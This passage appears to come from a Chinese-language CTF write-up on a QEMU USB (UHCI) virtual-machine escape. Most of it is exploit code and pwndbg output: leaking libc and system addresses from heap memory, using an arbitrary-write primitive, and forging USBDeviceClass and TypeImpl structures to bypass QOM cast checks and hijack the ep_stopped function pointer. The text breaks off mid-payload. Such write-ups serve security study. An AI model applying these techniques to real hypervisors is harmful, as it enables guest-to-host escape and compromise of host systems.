<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">uint64_t *tmp = (uint64_t *)(data_buf + 0x4);</span><br><span class="line">uint64_t libc_base = -1;</span><br><span class="line">uint64_t main_arena_xx_addr;</span><br><span class="line">//搜索main_arena指针</span><br><span class="line">for (int j=0;j&lt;100;j++) &#123;</span><br><span class="line">   for (int i=0;i&lt;0x400/0x8;i++) &#123;</span><br><span class="line">      main_arena_xx_addr = tmp[i];</span><br><span class="line">      if ((main_arena_xx_addr &gt;&gt; 40) == 0x7f &amp;&amp; ((main_arena_xx_addr &amp; 0xfff) == 0xc00)) &#123;</span><br><span class="line">         //printf(&quot;heap size=0x%lx fd=0x%lx\n&quot;,tmp[i-1],main_arena_xx_addr);</span><br><span class="line">         libc_base = main_arena_xx_addr - 0x1e0c00;</span><br><span class="line">         goto outer;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   //write(1,data_buf,0x400);</span><br><span class="line">   do_copy_read(0x400);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">outer:</span><br><span class="line">if(libc_base == -1)&#123;</span><br><span class="line">    printf(&quot;Error,DO IT AGAIN\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint64_t system_addr = libc_base + 0x4fa60;</span><br><span class="line">printf(&quot;leak libc_base address : 0x%lx!\n&quot;, libc_base);</span><br><span class="line">printf(&quot;leak system_addr address: 0x%lx!\n&quot;, system_addr);</span><br></pre></td></tr></table></figure>
<h3 id="劫持USBDeviceClass对象"><a href="#劫持USBDeviceClass对象" class="headerlink" title="劫持USBDeviceClass对象"></a>劫持USBDeviceClass对象</h3><p>虽然构造了任意地址写，但是却无法构造出任意地址读，主要是因为<code>UHCI</code>一次最多允许传输<code>0x7ff</code>大小读数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">struct USBDevice &#123;</span><br><span class="line">..................</span><br><span class="line">    uint8_t setup_buf[8];</span><br><span class="line">    uint8_t data_buf[4096];</span><br><span class="line">    int32_t remote_wakeup;</span><br><span class="line">    int32_t setup_state;</span><br><span class="line">    int32_t setup_len;</span><br><span class="line">    int32_t setup_index;</span><br><span class="line">.................</span><br></pre></td></tr></table></figure>
<p>而想要实现任意地址读，我们需要同时控制<code>setup_buf</code>和后面的<code>setup_state</code>、<code>setup_len</code>、<code>setup_index</code>，他们，由于<code>setup_buf</code>与后面三个多跨度超过了<code>0x7ff</code>，因此无法一次性进行控制，无法将当前的写数据模式转变为读数据模式。</p>
<p>由于已经有了glibc的一些地址，已经足够我们使用。稳定的劫持程序流程的方法是伪造<code>USBDevice</code>结构体中的第一个成员，即<code>USBDeviceClass *</code>，因为通过泄露远程环境中的内存数据，发现远程内存中数据复杂，不适合进行劫持。这个方法是如何找到的？首先我们利用<code>gdb</code>调试任意一个<code>qemu-system-x86_64</code>,并在<code>do_token_in</code>下断点，然后执行测试程序，让qemu运行到断点的地方，此时将<code>USBDevice</code>结构体中的第一个成员修改为0。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/sea/Desktop/qemu/hw/usb/core.c</span><br><span class="line">   208             usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);</span><br><span class="line">   209             s-&gt;setup_index += len;</span><br><span class="line">   210             if (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;</span><br><span class="line">   211                 s-&gt;setup_state = SETUP_STATE_ACK;</span><br><span class="line">   212             &#125;</span><br><span class="line"> ► 213             return;</span><br><span class="line">   214         &#125;</span><br><span class="line">   215         s-&gt;setup_state = SETUP_STATE_IDLE;</span><br><span class="line">   216         p-&gt;status = USB_RET_STALL;</span><br><span class="line">   217         break;</span><br><span class="line">   218 </span><br><span class="line">pwndbg&gt; p s</span><br><span class="line">$174 = (USBDevice *) 0x55dcfe269560</span><br><span class="line">pwndbg&gt; tel 0x55dcfe269560</span><br><span class="line">00:0000│   0x55dcfe269560 —▸ 0x55dcfd108800 —▸ 0x55dcfd0bc950 —▸ 0x55dcfd0bcad0 ◂— &#x27;usb-storage&#x27;</span><br><span class="line">01:0008│   0x55dcfe269568 —▸ 0x7f20cb21e770 (g_free) ◂— endbr64 </span><br><span class="line">02:0010│   0x55dcfe269570 —▸ 0x55dcfe233580 ◂— 0x20 /* &#x27; &#x27; */</span><br><span class="line">03:0018│   0x55dcfe269578 ◂— 0x2</span><br><span class="line">04:0020│   0x55dcfe269580 —▸ 0x55dcfd1379e0 —▸ 0x55dcfd0ea070 —▸ 0x55dcfd0c2ad0 —▸ 0x55dcfd0c2c50 ◂— ...</span><br><span class="line">05:0028│   0x55dcfe269588 ◂— 0x0</span><br><span class="line">06:0030│   0x55dcfe269590 ◂— 0x1</span><br><span class="line">07:0038│   0x55dcfe269598 —▸ 0x55dcfd0c8ad0 ◂— 0x0</span><br><span class="line">pwndbg&gt; eq 0x55dcfe269560 0</span><br></pre></td></tr></table></figure>
<p>然后继续运行，qemu必定会崩溃，<code>gdb</code>会捕捉到崩溃发生的地方</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Thread 1 &quot;qemu-system-x86&quot; received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x000055dcfbc82fe8 in usb_device_ep_stopped (dev=0x55dcfe269560, ep=0x55dcfe26a648) at hw/usb/bus.c:223</span><br><span class="line">.........................</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">In file: /home/sea/Desktop/qemu/hw/usb/bus.c</span><br><span class="line">   218 &#125;</span><br><span class="line">   219 </span><br><span class="line">   220 void usb_device_ep_stopped(USBDevice *dev, USBEndpoint *ep)</span><br><span class="line">   221 &#123;</span><br><span class="line">   222     USBDeviceClass *klass = USB_DEVICE_GET_CLASS(dev);</span><br><span class="line"> ► 223     if (klass-&gt;ep_stopped) &#123;</span><br><span class="line">   224         klass-&gt;ep_stopped(dev, ep);</span><br><span class="line">   225     &#125;</span><br><span class="line">   226 &#125;</span><br></pre></td></tr></table></figure>
<p>从这就可以知道，当<code>do_token_in</code>或者<code>do_token_out</code>操作完成以后，最先要用到<code>USBDeviceClass *</code>指针的地方是这里，并且可以看到后面还有一个函数指针调用。那么伪造一个<code>USBDeviceClass *</code>是绝佳的选择。该结构体中，我们需要伪造的数据主要有以下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">typedef struct USBDeviceClass &#123;</span><br><span class="line">    DeviceClass parent_class;</span><br><span class="line">.....................</span><br><span class="line">    /*</span><br><span class="line">     * Called by the hcd to let the device know the queue for an endpoint</span><br><span class="line">     * has been unlinked / stopped. Optional may be NULL.</span><br><span class="line">     */</span><br><span class="line">    void (*ep_stopped)(USBDevice *dev, USBEndpoint *ep);</span><br><span class="line"></span><br><span class="line">.....................</span><br><span class="line">&#125; USBDeviceClass;</span><br></pre></td></tr></table></figure>
<p>将<code>ep_stopped</code>指向gadgets，进而可以做栈迁移。首先，我们将<code>USBDeviceClass *</code>修改为一个任意的可读写的堆地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uint64_t payload[0x400/0x8];</span><br><span class="line">payload[0x0] = dev_addr + 0x10;</span><br><span class="line">arb_write_seq(dev_addr,payload,0x400);</span><br></pre></td></tr></table></figure>
<p>然后在运行qemu，并执行程序，用gdb调试捕捉崩溃</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/sea/Desktop/qemu/hw/usb/core.c</span><br><span class="line">   546 void usb_packet_set_state(USBPacket *p, USBPacketState state)</span><br><span class="line">   547 &#123;</span><br><span class="line">   548     if (p-&gt;ep) &#123;</span><br><span class="line">   549         USBDevice *dev = p-&gt;ep-&gt;dev;</span><br><span class="line">   550         USBBus *bus = usb_bus_from_device(dev);</span><br><span class="line"> ► 551         trace_usb_packet_state_change(bus-&gt;busnr, dev-&gt;port-&gt;path, p-&gt;ep-&gt;nr, p,</span><br><span class="line">   552                                       usb_packet_state_name(p-&gt;state),</span><br><span class="line">   553                                       usb_packet_state_name(state));</span><br><span class="line">   554     &#125; else &#123;</span><br><span class="line">....................</span><br><span class="line">pwndbg&gt; p bus</span><br><span class="line">$9 = (USBBus *) 0x0</span><br><span class="line">pwndbg&gt; p *dev</span><br><span class="line">$8 = &#123;</span><br><span class="line">  qdev = &#123;</span><br><span class="line">    parent_obj = &#123;</span><br><span class="line">      class = 0x5584542726c8,</span><br><span class="line">      free = 0x0,</span><br><span class="line">      properties = 0x0,</span><br><span class="line">      ref = 0,</span><br><span class="line">      parent = 0x0</span><br><span class="line">    &#125;,</span><br><span class="line">    id = 0x0,</span><br><span class="line">    realized = false,</span><br><span class="line">    pending_deleted_event = false,</span><br><span class="line">    opts = 0x0,</span><br><span class="line">    hotplugged = 0,</span><br><span class="line">    parent_bus = 0x0,</span><br><span class="line">.................</span><br></pre></td></tr></table></figure>
<p>其中<code>usb_bus_from_device</code>代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">static inline USBBus *usb_bus_from_device(USBDevice *d)</span><br><span class="line">&#123;</span><br><span class="line">    return DO_UPCAST(USBBus, qbus, d-&gt;qdev.parent_bus);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>崩溃原因是<code>dev-&gt;qdev-&gt;parent_bus</code>指针被我们覆盖了，同时<code>dev-&gt;port</code>也被我们覆盖了，因此也需要重新伪造上去</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">uint64_t payload[0x400/0x8];</span><br><span class="line">payload[0x0] = dev_addr + 0x10;</span><br><span class="line">//fake a USBDeviceClass at dev_addr + 0x10</span><br><span class="line">payload[0x9] = dev_addr + 0x8; //bus</span><br><span class="line">payload[0xe] = dev_addr + 0x8; //port</span><br><span class="line">arb_write_seq(dev_addr,payload,0x400);</span><br></pre></td></tr></table></figure>
<p>这次运行，崩溃在这里</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/sea/Desktop/qemu/qom/object.c</span><br><span class="line">   700                                               const char *file, int line,</span><br><span class="line">   701                                               const char *func)</span><br><span class="line">   702 &#123;</span><br><span class="line">   703     ObjectClass *ret;</span><br><span class="line">   704 </span><br><span class="line"> ► 705     trace_object_class_dynamic_cast_assert(class ? class-&gt;type-&gt;name : &quot;(null)&quot;,</span><br><span class="line">   706                                            typename, file, line, func);</span><br><span class="line">   707 </span><br><span class="line">   708 #ifdef CONFIG_QOM_CAST_DEBUG</span><br><span class="line">   709     int i;</span><br><span class="line">   710 </span><br><span class="line">pwndbg&gt; p class</span><br><span class="line">$20 = (ObjectClass *) 0x55bb52c756d0</span><br><span class="line">pwndbg&gt; p class-&gt;type</span><br><span class="line">$21 = (Type) 0x0</span><br></pre></td></tr></table></figure>
<p>class-&gt;type也应该伪造为一个可读的地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">uint64_t payload[0x400/0x8];</span><br><span class="line">payload[0x0] = dev_addr + 0x10;</span><br><span class="line"> //fake a USBDeviceClass at dev_addr + 0x10</span><br><span class="line">payload[0x2] = dev_addr + 0x8; //type</span><br><span class="line">payload[0x9] = dev_addr + 0x8; //bus</span><br><span class="line">payload[0xe] = dev_addr + 0x8; //port</span><br><span class="line">arb_write_seq(dev_addr,payload,0x400);</span><br></pre></td></tr></table></figure>
<p>这一次，程序没有崩溃，而是抛出了异常</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hw/usb/bus.c:222:usb_device_ep_stopped: Object 0x55d6988446d0 is not an instance of type usb-device</span><br><span class="line">pwndbg&gt; k</span><br><span class="line">#0  __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:49</span><br><span class="line">#1  0x00007f5c775cf864 in __GI_abort () at abort.c:79</span><br><span class="line">#2  0x000055d6961aeffb in object_class_dynamic_cast_assert (class=0x55d6988446d0, typename=0x55d69639e358 &quot;usb-device&quot;, file=0x55d69639e2cf &quot;hw/usb/bus.c&quot;, line=222, func=0x55d69639e890 &lt;__func__.23&gt; &quot;usb_device_ep_stopped&quot;) at qom/object.c:727</span><br><span class="line">#3  0x000055d6960f1480 in usb_device_ep_stopped (dev=0x55d6988446c0, ep=0x55d6988457a8) at hw/usb/bus.c:222</span><br><span class="line">.....................</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>
<p>并且从中可以看到，<code>usb_device_ep_stopped</code>是已经执行到了，发生异常是因为<code>object_class_dynamic_cast_assert</code>校验我们伪造的<code>USBDeviceClass *</code>没有通过。同时，我们也得到一个很重要的信息<code>hw/usb/bus.c:222</code>，在远程机器上，我们知道这个异常发生在<code>bus.c</code>文件的<code>222</code>行，那么意味着我们已经可以将远程qemu的版本缩小到一个范围。<br>其中<code>object_class_dynamic_cast_assert</code>源码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">ObjectClass *object_class_dynamic_cast_assert(ObjectClass *class,</span><br><span class="line">                                              const char *typename,</span><br><span class="line">                                              const char *file, int line,</span><br><span class="line">                                              const char *func)</span><br><span class="line">&#123;</span><br><span class="line">    ObjectClass *ret;</span><br><span class="line"></span><br><span class="line">    trace_object_class_dynamic_cast_assert(class ? class-&gt;type-&gt;name : &quot;(null)&quot;,</span><br><span class="line">                                           typename, file, line, func);</span><br><span class="line"></span><br><span class="line">#ifdef CONFIG_QOM_CAST_DEBUG</span><br><span class="line">    int i;</span><br><span class="line"></span><br><span class="line">    for (i = 0; class &amp;&amp; i &lt; OBJECT_CLASS_CAST_CACHE; i++) &#123;</span><br><span class="line">        if (atomic_read(&amp;class-&gt;class_cast_cache[i]) == typename) &#123;</span><br><span class="line">            ret = class;</span><br><span class="line">            goto out;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">#else</span><br><span class="line">    if (!class || !class-&gt;interfaces) &#123;</span><br><span class="line">        return class;</span><br><span class="line">    &#125;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">    ret = object_class_dynamic_cast(class, typename);</span><br><span class="line">    if (!ret &amp;&amp; class) &#123;</span><br><span class="line">        fprintf(stderr, &quot;%s:%d:%s: Object %p is not an instance of type %s\n&quot;,</span><br><span class="line">                file, line, func, class, typename);</span><br><span class="line">        abort();</span><br><span class="line">    &#125;</span><br><span class="line">...................</span><br></pre></td></tr></table></figure>
<p>可以看到如果在<code>class-&gt;class_cast_cache[i]</code>中存在<code>typename</code>指针，则可以通过娇艳，经过调试，发现<code>typename</code>是<code>qemu-systen-x86_64</code>中的地址，显然我们不能用，因为我们没有远程的附件。于是继续向下看<code>object_class_dynamic_cast</code>函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">ObjectClass *object_class_dynamic_cast(ObjectClass *class,</span><br><span class="line">                                       const char *typename)</span><br><span class="line">&#123;</span><br><span class="line">    ObjectClass *ret = NULL;</span><br><span class="line">    TypeImpl *target_type;</span><br><span class="line">    TypeImpl *type;</span><br><span class="line"></span><br><span class="line">    if (!class) &#123;</span><br><span class="line">        return NULL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* A simple fast path that can trigger a lot for leaf classes.  */</span><br><span class="line">    type = class-&gt;type;</span><br><span class="line">    if (type-&gt;name == typename) &#123;</span><br><span class="line">        return class;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    target_type = type_get_by_name(typename);</span><br><span class="line">    if (!target_type) &#123;</span><br><span class="line">        /* target class type unknown, so fail the cast */</span><br><span class="line">        return NULL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (type-&gt;class-&gt;interfaces &amp;&amp;</span><br><span class="line">            type_is_ancestor(target_type, type_interface)) &#123;</span><br><span class="line">        int found = 0;</span><br><span class="line">        GSList *i;</span><br><span class="line"></span><br><span class="line">        for (i = class-&gt;interfaces; i; i = i-&gt;next) &#123;</span><br><span class="line">            ObjectClass *target_class = i-&gt;data;</span><br><span class="line"></span><br><span class="line">            if (type_is_ancestor(target_class-&gt;type, target_type)) &#123;</span><br><span class="line">                ret = target_class;</span><br><span class="line">                found++;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">        /* The match was ambiguous, don&#x27;t allow a cast */</span><br><span class="line">        if (found &gt; 1) &#123;</span><br><span class="line">            ret = NULL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else if (type_is_ancestor(type, target_type)) &#123;</span><br><span class="line">        ret = class;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里，我们伪造<code>type-&gt;class-&gt;interfaces</code>为0，于是进入分支<code>else if (type_is_ancestor(type, target_type))</code>，只要<code>type_is_ancestor</code>为真就可以通过校验<br>其中<code>type_is_ancestor</code>代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">static bool type_is_ancestor(TypeImpl *type, TypeImpl *target_type)</span><br><span class="line">&#123;</span><br><span class="line">    assert(target_type);</span><br><span class="line"></span><br><span class="line">    /* Check if target_type is a direct ancestor of type */</span><br><span class="line">    while (type) &#123;</span><br><span class="line">        if (type == target_type) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        type = type_get_parent(type);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static TypeImpl *type_get_parent(TypeImpl *type)</span><br><span class="line">&#123;</span><br><span class="line">    if (!type-&gt;parent_type &amp;&amp; type-&gt;parent) &#123;</span><br><span class="line">        type-&gt;parent_type = type_get_by_name(type-&gt;parent);</span><br><span class="line">        g_assert(type-&gt;parent_type != NULL);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return type-&gt;parent_type;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static TypeImpl *type_get_parent(TypeImpl *type)</span><br><span class="line">&#123;</span><br><span class="line">    if (!type-&gt;parent_type &amp;&amp; type-&gt;parent) &#123;</span><br><span class="line">        type-&gt;parent_type = type_get_by_name(type-&gt;parent);</span><br><span class="line">        g_assert(type-&gt;parent_type != NULL);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return type-&gt;parent_type;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static TypeImpl *type_get_by_name(const char *name)</span><br><span class="line">&#123;</span><br><span class="line">    if (name == NULL) &#123;</span><br><span class="line">        return NULL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return type_table_lookup(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过分析，我们只需要伪造一个<code>type-&gt;parent</code>字符串为对象的名字，比如<code>usb-device</code>，同时伪造<code>type-&gt;parent_type</code>为0，这样，就可以调用<code>type_get_by_name</code>从全局对象hash表中查找对应的<code>Type</code>返回。<br>于是，我们的伪造如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">uint64_t payload[0x400/0x8];</span><br><span class="line"></span><br><span class="line">int type_base = 0x25;</span><br><span class="line"></span><br><span class="line">payload[0x0] = dev_addr + 0x10;</span><br><span class="line">//fake a USBDeviceClass at dev_addr + 0x10</span><br><span class="line">payload[0x2] = dev_addr + type_base*0x8; //type</span><br><span class="line">payload[0x9] = dev_addr + 0x8; //bus</span><br><span class="line">payload[0xe] = dev_addr + 0x8; //port</span><br><span class="line"></span><br><span class="line">//fake a type</span><br><span class="line">payload[type_base] = 0; //name</span><br><span class="line">payload[type_base+0xb] = dev_addr + (type_base + 0xe) * 8;</span><br><span class="line">payload[type_base+0xc] = 0; //type-&gt;parent_type</span><br><span class="line">payload[type_base+0xd] = dev_addr + 0x8; //type-&gt;class</span><br><span class="line">char *p = &quot;usb-device&quot;;</span><br><span class="line">memcpy(&amp;payload[type_base + 0xe],p,strlen(p)+1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">arb_write_seq(dev_addr,payload,0x400);</span><br></pre></td></tr></table></figure>
<p>在<code>usb_device_ep_stopped</code>下断点进行调试，这次成功通过了校验</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/sea/Desktop/qemu/hw/usb/bus.c</span><br><span class="line">   218 &#125;</span><br><span class="line">   219 </span><br><span class="line">   220 void usb_device_ep_stopped(USBDevice *dev, USBEndpoint *ep)</span><br><span class="line">   221 &#123;</span><br><span class="line">   222     USBDeviceClass *klass = USB_DEVICE_GET_CLASS(dev);</span><br><span class="line"> ► 223     if (klass-&gt;ep_stopped) &#123;</span><br><span class="line">   224         klass-&gt;ep_stopped(dev, ep);</span><br><span class="line">   225     &#125;</span><br><span class="line">   226 &#125;</span><br><span class="line">pwndbg&gt; p klass</span><br><span class="line">$23 = (USBDeviceClass *) 0x555955f036d0</span><br></pre></td></tr></table></figure>
<p>klass指向了我们伪造的class，为了进一步缩小远程的qemu版本范围，我们将<code>type-&gt;parent</code>字符串修改为一个任意值，如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">uint64_t payload[0x400/0x8];</span><br><span class="line"></span><br><span class="line">int type_base = 0x25;</span><br><span class="line"></span><br><span class="line">payload[0x0] = dev_addr + 0x10;</span><br><span class="line">//fake a USBDeviceClass at dev_addr + 0x10</span><br><span class="line">payload[0x2] = dev_addr + type_base*0x8; //type</span><br><span class="line">payload[0x9] = dev_addr + 0x8; //bus</span><br><span class="line">payload[0xe] = dev_addr + 0x8; //port</span><br><span class="line"></span><br><span class="line">//fake a type</span><br><span 